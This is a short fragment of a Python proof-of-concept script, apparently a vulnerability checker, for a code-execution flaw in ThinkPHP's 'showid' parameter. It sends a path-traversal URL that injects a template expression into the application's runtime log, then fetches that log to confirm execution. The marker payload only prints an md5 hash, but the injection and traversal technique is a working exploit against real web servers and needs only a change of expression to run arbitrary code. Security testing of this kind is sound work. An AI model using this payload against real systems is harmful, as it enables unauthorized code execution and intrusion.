...
def poc(target):
    ...
    try:
        vurl = urllib.parse.urljoin(target,'index.php?s=my-show-id-\\x5C..\\x5CTpl\\x5C8edy\\x5CHome\\x5Cmy_1{~var_dump(md5(2333))}]')
        req = requests.get(vurl, headers=headers, timeout=15, verify=False)
        timenow = datetime.datetime.now().strftime("%Y_%m_%d")[2:]
        vurl2 = urllib.parse.urljoin(target,'index.php?s=my-show-id-\\x5C..\\x5CRuntime\\x5CLogs\\x5C{0}.log'.format(timenow))
        req2 = requests.get(vurl2, headers=headers, timeout=15, verify=False)
        if r"56540676a129760a3" in req2.text:
            result['vulnerable'] = True
            result['method'] = 'GET'
            result['url'] = vurl
            result['payload'] = vurl2
            print(result)
    except:
        print(f"{target}访问失败")
...
def main():
    parser = argparse.ArgumentParser("Thinkphp Index showid参数代码执行漏洞检测POC")
